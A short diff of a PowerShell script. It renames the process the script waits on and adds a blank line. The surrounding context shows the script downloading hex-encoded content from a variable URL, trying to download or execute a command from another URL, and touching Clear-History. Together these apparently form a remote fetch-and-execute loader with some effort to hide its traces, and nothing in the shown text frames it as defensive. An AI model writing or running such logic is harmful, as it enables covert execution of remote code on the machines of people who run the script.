@@ -45,7 +45,7 @@ try {
 }
 do {
     Start-Sleep -Seconds 2
-} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)
+} while (Get-Process -Name "Installer.exe" -ErrorAction SilentlyContinue)
 try {
     $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
     $newHexContent = $responseC.Content
@@ -68,4 +68,5 @@ try {
     Write-Error "Failed to download or execute command from $urlD`: $_"
 }
 Get-Content function:Clear-History | Out-Null
+
 
